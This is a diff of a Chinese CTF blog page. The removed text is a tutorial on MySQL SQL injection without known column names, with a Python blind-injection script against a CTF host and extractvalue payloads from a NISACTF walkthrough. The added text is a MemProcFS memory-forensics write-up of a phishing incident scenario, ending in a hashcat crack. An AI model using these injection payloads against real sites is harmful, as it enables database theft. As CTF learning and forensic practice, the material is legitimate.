@@ -16,26 +16,26 @@
   <meta name="author" content="J_0k3r">
   <meta name="keywords" content="">
   
-    <meta name="description" content="情人游天地 日月换行李 -《我们万岁》陈奕迅">
+    <meta name="description" content="不开心未必不堪 快乐也要找原因 -《开不了心》陈奕迅">
 <meta property="og:type" content="article">
-<meta property="og:title" content="无列名注入">
-<meta property="og:url" content="http://example.com/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="MemProcFS 内存取证">
+<meta property="og:url" content="http://example.com/2023/12/05/MemProcFS%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="J_0k3r">
-<meta property="og:description" content="情人游天地 日月换行李 -《我们万岁》陈奕迅">
+<meta property="og:description" content="不开心未必不堪 快乐也要找原因 -《开不了心》陈奕迅">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/44.jpg">
-<meta property="article:published_time" content="2023-12-04T15:27:32.000Z">
-<meta property="article:modified_time" content="2023-12-05T12:45:54.207Z">
+<meta property="og:image" content="http://example.com/img/a8.jpg">
+<meta property="article:published_time" content="2023-12-05T15:27:32.000Z">
+<meta property="article:modified_time" content="2023-12-06T11:51:46.204Z">
 <meta property="article:author" content="J_0k3r">
 <meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/44.jpg">
+<meta name="twitter:image" content="http://example.com/img/a8.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>无列名注入 - J_0k3r</title>
+  <title>MemProcFS 内存取证 - J_0k3r</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -222,13 +222,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/a3.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('/img/a9.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="无列名注入"></span>
+            <span id="subtitle" data-typed-text="MemProcFS 内存取证"></span>
           
         </div>
 
@@ -244,8 +244,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-04 23:27" pubdate>
-          2023年12月4日 晚上
+        <time datetime="2023-12-05 23:27" pubdate>
+          2023年12月5日 晚上
         </time>
       </span>
     
@@ -256,7 +256,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.8k 字
+          2.7k 字
         
       </span>
     
@@ -313,35 +313,20 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">无列名注入</h1>
+            <h1 style="display: none">MemProcFS 内存取证</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>通常情况是columns被ban了或者information被ban了 等读取不到列名的情况</strong></p>
-<h3 id="information被ban时可以用以下表获取表名然后配合无列名注入"><a href="#information被ban时可以用以下表获取表名然后配合无列名注入" class="headerlink" title="information被ban时可以用以下表获取表名然后配合无列名注入"></a>information被ban时可以用以下表获取表名然后配合无列名注入</h3><p>注：sys库需要root权限才能访问。innodb在mysql中是默认关闭的。</p>
-<h4 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h4><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，<strong>但是没有存储列名</strong>。</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql.innodb<span class="hljs-emphasis">_table_stats</span><br><span class="hljs-emphasis">mysql.innodb_index_</span>stats<br></code></pre></td></tr></table></figure>
-<h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取<strong>表名</strong>。</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics<br>sys.x$ps_schem<span class="hljs-built_in">a_table</span>_statistics_io<br>sys.x$schem<span class="hljs-built_in">a_flattened</span>_keys<br></code></pre></td></tr></table></figure>
-<h3 id="没ban掉union可以用设置别名的方式来绕过列名"><a href="#没ban掉union可以用设置别名的方式来绕过列名" class="headerlink" title="没ban掉union可以用设置别名的方式来绕过列名"></a>没ban掉union可以用设置别名的方式来绕过列名</h3><p><strong>union可以构造一个虚拟表</strong><br><code> select 1,2,3,4 union select *from teacher</code><br><img src="/mdimg/wlmzr/1.png" srcset="/img/loading.gif" lazyload><br>**select的字段数要和table一样 **<br>后面就可以用<br><code>select </code>2<code> from (select 1,2,3,4 union select *from teacher)n //n不可省略(作用是设置别名)</code><br><img src="/mdimg/wlmzr/2.png" srcset="/img/loading.gif" lazyload><br>这种来读取数据而不需要知道原先表的列名<br>ban了````时可以设置别名 <code>as</code>可以省略<br><code>select b from (select 1 a,2 b,3 c,4 d union select *from teacher)n</code><br><img src="/mdimg/wlmzr/3.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="通过ascii位移无列名注入"><a href="#通过ascii位移无列名注入" class="headerlink" title="通过ascii位移无列名注入"></a>通过ascii位移无列名注入</h3><p>首先可以通过类似这样的语句爆出字段数<br><code>(select 1,2,3) &gt; (select *from teacher)</code><br>字段数相等会返回1，不相等则会报错<br><img src="/mdimg/wlmzr/4.png" srcset="/img/loading.gif" lazyload><br>然后可以通过比较ascii大小来爆出数据<br><img src="/mdimg/wlmzr/5.png" srcset="/img/loading.gif" lazyload><br>实际上是比较每一个字符的ascii 然后返回0 false 或者 1 true<br>然后可以比较表中数据来盲注<br><code>select (select &#39;flag&#39;) &gt; (select *from test)</code><br><img src="/mdimg/wlmzr/6.png" srcset="/img/loading.gif" lazyload><br>跟&gt;的布尔盲注类似 返回1的前一个ASCII字符就是表中数据<br>贴个jio本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span>  requests<br><br>baseurl=<span class="hljs-string">&quot;http://17d5864a-27fc-4fc7-be88-e639f3f55898.node4.buuoj.cn:81/index.php&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">flag</span>):<br>    res=<span class="hljs-string">&#x27;&#x27;</span><br>    res+=flag<br>    <span class="hljs-keyword">return</span> res<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        datachar = add(flag+<span class="hljs-built_in">chr</span>(char)) <span class="hljs-comment">#增加下一个比对的字符串</span><br>        payload=<span class="hljs-string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(datachar)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>:payload<br>        &#125;<br>        req=requests.post(url=baseurl,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> req.text:<br>            flag += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> req.status_code == <span class="hljs-number">429</span>:<br>            time.sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure>
-<h3 id="ban-了columns-但没ban掉information"><a href="#ban-了columns-但没ban掉information" class="headerlink" title="ban 了columns 但没ban掉information"></a>ban 了columns 但没ban掉information</h3><p>join 的作用是连接两个表<br>在使用别名的时候，表中不能出现相同的字段名<br><code>(select * from (select * from test as a join test as b) as c);</code><br><strong>a、b是同一个表连接，有相同的字段，select c(别名) 时 会报错出相同的列名</strong><br>ps：<br>SELECT *时，USING会去除USING指定的列 ，可以用来爆破其他列名<br><code>(select * from (select * from test as a join test as b using(id)) as c);</code></p>
-<h3 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h3><p><strong>fuzz</strong><br>过滤了：</p>
-<ul>
-<li>database</li>
-<li>= //用 like</li>
-<li>union</li>
-<li>and //用 or</li>
-<li>columns</li>
-<li>sleep</li>
-<li>updatexml //extractvalue</li>
-<li>substr //mid or limit</li>
-<li>left</li>
-<li>right</li>
-</ul>
-<p>ban了database<br><code>tt=1&#39;or(select *from a)#</code>  通过不存在的表爆出库名 sqlsql<br>不知道为什么这里用<code>or</code>就不行要用 <code>||</code><br><code>tt=1&#39; || (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#39;sqlsql&#39;))))# </code><br>表：<code>Fal_flag , output</code><br><code>columns</code>被ban了<br>无列名注入：<br>这里<code>as</code>被ban了<br>可以省略as 设置别名<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from output a join output b) c)))#</code><br>-&gt;  data<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b) c)))#</code><br>-&gt;  id<br>爆数据<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select data from output)))#</code><br>-&gt;   NSSCTF{752a1163-4e92-47d5-91<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,mid((select data from output),29,48)))#</code><br>-&gt;   9b-ef75c021f69e}</p>
+                <p>ok啊，kali没内存了，vol用不上<br>刚好接触新工具MemProcFS，很直观能看到各种文件，不用记命令<br>但是第一次用不太熟，也没看到啥文章，一个个横冲直撞的找文件很煎熬<br>注册表这种也是看不懂<br>道阻且长</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>pip install leechcorepyc</code><br><a target="_blank" rel="noopener" href="https://github.com/ufrisk/MemProcFS/releases">https://github.com/ufrisk/MemProcFS/releases</a><br>安装最新版本<br>解压即可食用</p>
+<h2 id="某医疗行业赛取证"><a href="#某医疗行业赛取证" class="headerlink" title="某医疗行业赛取证"></a>某医疗行业赛取证</h2><h3 id="鱼叉攻击场景溯源-1"><a href="#鱼叉攻击场景溯源-1" class="headerlink" title="鱼叉攻击场景溯源_1"></a>鱼叉攻击场景溯源_1</h3><p>题目内容：<br>某医院门诊挂号系统遭遇钓鱼攻击，系统内被植入木马程序，现请你对该场景下受灾系统进行分析溯源并回答如下问题。<br>（本题附件名：yuchagongji.7z）<br>请分析受灾系统的主机基本信息（答案格式为flag{系统主机名+系统用户名+系统用户SID+操作系统构建build编号+主机网卡的固定IP地址的md5值}<br>例如：系统主机名为weiruan，系统用户名为user1，系统用户SID为S-1-4-18-3218096128-1257898252-2035427519-1003，操作系统构建build编号为20230，主机网卡的固定IP地址为192.168.20.23，flag即为flag{md5(weiruan+user1+S-1-4-18-3218096128-1257898252-2035427519-1003+20230+192.168.20.23)}即flag{41e10eec498a50be9591c8e641aafcf3}<br><code>.\MemProcFS.exe -device \Desktop\forensic.raw -forensic 0</code> （相关命令可以参考<a target="_blank" rel="noopener" href="https://github.com/ufrisk/MemProcFS/wiki/_CommandLine">https://github.com/ufrisk/MemProcFS/wiki/_CommandLine</a><br><img src="/mdimg/memprocfs/1.png" srcset="/img/loading.gif" lazyload><br>此时这个工具给我们生成了一个虚拟磁盘（默认是M 如果M已经存在，加上-mount Z 指定别名<br><img src="/mdimg/memprocfs/2.png" srcset="/img/loading.gif" lazyload><br>在sys目录下存放了系统相关信息<br><img src="/mdimg/memprocfs/3.png" srcset="/img/loading.gif" lazyload><br>在sys目录下可以得到以下信息</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">系统主机名             CORE-<span class="hljs-number">2023</span><br>系统用户名                           H_admin     <span class="hljs-regexp">//</span> 在sys<span class="hljs-regexp">/users/</span><br>系统用户SID             S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3114095118</span>-<span class="hljs-number">2402888954</span>-<span class="hljs-number">2065529513</span>-<span class="hljs-number">1001</span>    <span class="hljs-regexp">//</span> 在sys<span class="hljs-regexp">/users/</span><br>操作系统构建build编号     <span class="hljs-number">22621</span><br></code></pre></td></tr></table></figure>
+<p><code>sys/net</code>目录下存放了服务及网卡监听端口信息，里面有本机ip<br><img src="/mdimg/memprocfs/4.png" srcset="/img/loading.gif" lazyload><br><code>192.168.52.130</code><br>flag<br><code>CORE-2023+H_admin+S-1-5-21-3114095118-2402888954-2065529513-1001+22621+192.168.52.130 ``flag&#123;e2e33285c9d60df458717e45c3bcfe01&#125; </code></p>
+<h3 id="鱼叉攻击场景溯源-2"><a href="#鱼叉攻击场景溯源-2" class="headerlink" title="鱼叉攻击场景溯源_2"></a>鱼叉攻击场景溯源_2</h3><p>题目内容：<br>遭受钓鱼攻击的不当操作源头网络信息为（答案格式为flag{钓鱼攻击使用网站标题+钓鱼攻击使用的恶意程序http下载链接的md5值，例如<a target="_blank" rel="noopener" href="http://192.168.150.1/test.zip/">http://192.168.150.1/test.zip/</a>，链接目录结尾保留“/”}）<br>例如：钓鱼攻击使用网站标题是”系统检查”,钓鱼攻击使用的恶意程序http下载链接是<a target="_blank" rel="noopener" href="http://192.168.20.23:9999/hello.zip/">http://192.168.20.23:9999/hello.zip/</a>，flag即为flag{md5(系统检查+<a target="_blank" rel="noopener" href="http://192.168.20.23:9999/hello.zip/">http://192.168.20.23:9999/hello.zip/)</a>)}即flag{8d58631224fd41cb30d94edb9e1e9b77}<br>这里直接010打开镜像文件检索<code>[http://192](http://192)</code> 右下角改为显示文本和utf-8编码<br><img src="/mdimg/memprocfs/5.png" srcset="/img/loading.gif" lazyload><br>得到下载链接<br><code>http://192.168.2.113:2222/Patch_Update.zip/</code><br>网站标题<br><code>医疗系统补丁更新下载站</code><br>这里有一个工具<a target="_blank" rel="noopener" href="https://www.gimp.org/">GIMP - GNU Image Manipulation Program</a> 是一个类似ps的图像编辑器<br>可以导入如.raw的镜像来查看数据<br>找到<code>M:\name\msedge.exe-7276\minidump</code> 的<code>.dmp</code>文件 改后缀为<code>.data</code>然后拖进gimp<br>调整图像宽高可以看到<br><img src="/mdimg/memprocfs/6.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="鱼叉攻击场景溯源-3"><a href="#鱼叉攻击场景溯源-3" class="headerlink" title="鱼叉攻击场景溯源_3"></a>鱼叉攻击场景溯源_3</h3><p>题目内容：<br>请分析钓鱼攻击使用的恶意程序软件，还原恶意程序软件名及植入木马程序的命令(答案格式为flag{恶意程序软件名+恶意命令的小写md5值}，恶意程序软件名包括文件名和文件大写扩展名，例如name.EXE，去除恶意命令中的“,”号，命令中空格间隔均为1个)<br>例如恶意程序软件名是shell.exe,恶意命令为curl.exe <a target="_blank" rel="noopener" href="http://www.baidu.com,flag即为flag{md5/">www.baidu.com,flag即为flag{md5</a>(shell.exe+curl.exe <a target="_blank" rel="noopener" href="http://www.baidu.com)}即flag{4b17c1d9b0e22e773554f91994db048b}/">www.baidu.com)}即flag{4b17c1d9b0e22e773554f91994db048b}</a><br>待定</p>
+<h3 id="鱼叉攻击场景溯源-4"><a href="#鱼叉攻击场景溯源-4" class="headerlink" title="鱼叉攻击场景溯源_4"></a>鱼叉攻击场景溯源_4</h3><p>题目内容：<br>钓鱼攻击后该系统被植入的木马程序为（答案格式为flag{木马程序软件名+木马程序回连地址的md5值}，回连地址格式为ip:port，例如192.168.150.1:443）<br>例如192.168.150.1:443对应的flag是flag{md5(192.168.150.1:443)}即flag{05bb4939f4da0952d17f3a8fec3fbbf2}<br>查看<code> &quot;M:\sys\net\netstat-v.txt&quot;</code> 文件<br><img src="/mdimg/memprocfs/7.png" srcset="/img/loading.gif" lazyload><br>可以看到这个helper.exe是上面钓鱼网站下载下来的木马程序<br>并且可以得到与主机通讯连接的ip端口 为 <code>192.168.2.120:8023</code></p>
+<h3 id="鱼叉攻击场景溯源-5"><a href="#鱼叉攻击场景溯源-5" class="headerlink" title="鱼叉攻击场景溯源_5"></a>鱼叉攻击场景溯源_5</h3><p>题目内容：<br>该受灾系统曾经备份过的操作用户表中的admin用户明文为（答案格式为flag{admin用户明文密码的16进制值的md5值}，密码破解字典可使用kali自带密码本进行）<br>例如：admin明文是hello123，对应的16进制值就是68656c6c6f313233，md5值就是md5(68656c6c6f313233)最终结果为d2c4b16c3624a40efc2f28d7aa54f8c2，再加上flag{}即flag{d2c4b16c3624a40efc2f28d7aa54f8c2}<br>找到记事本的进程 <code>M:\name\Notepad.exe-4920</code><br><code>M:\name\Notepad.exe-4920\minidump</code> 把.bmp改为.data 然后gimp打开<br><img src="/mdimg/memprocfs/8.png" srcset="/img/loading.gif" lazyload><br><code>6d1ce7aa0a1d988dc96a2abcd187b45a</code><br>用hashcat爆破<br><code>hashcat -a 0 -m 0 6d1ce7aa0a1d988dc96a2abcd187b45a ./misc/rockyou.txt</code><br><img src="/mdimg/memprocfs/9.png" srcset="/img/loading.gif" lazyload><br><code>aptx4869</code></p>
 
                 
               </div>
@@ -394,8 +379,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>无列名注入</div>
-      <div>http://example.com/2023/12/04/无列名注入/</div>
+      <div>MemProcFS 内存取证</div>
+      <div>http://example.com/2023/12/05/MemProcFS使用/</div>
     </div>
     <div class="license-meta">
       
@@ -407,7 +392,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年12月4日</div>
+          <div>2023年12月5日</div>
         </div>
       
       
@@ -432,18 +417,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/05/MemProcFS%E4%BD%BF%E7%94%A8/" title="MemProcFS 内存取证">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MemProcFS 内存取证</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/11/29/ISCTF%202023/" title="ISCTF 2023 wp">
-                        <span class="hidden-mobile">ISCTF 2023 wp</span>
+                      <a href="/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" title="无列名注入">
+                        <span class="hidden-mobile">无列名注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
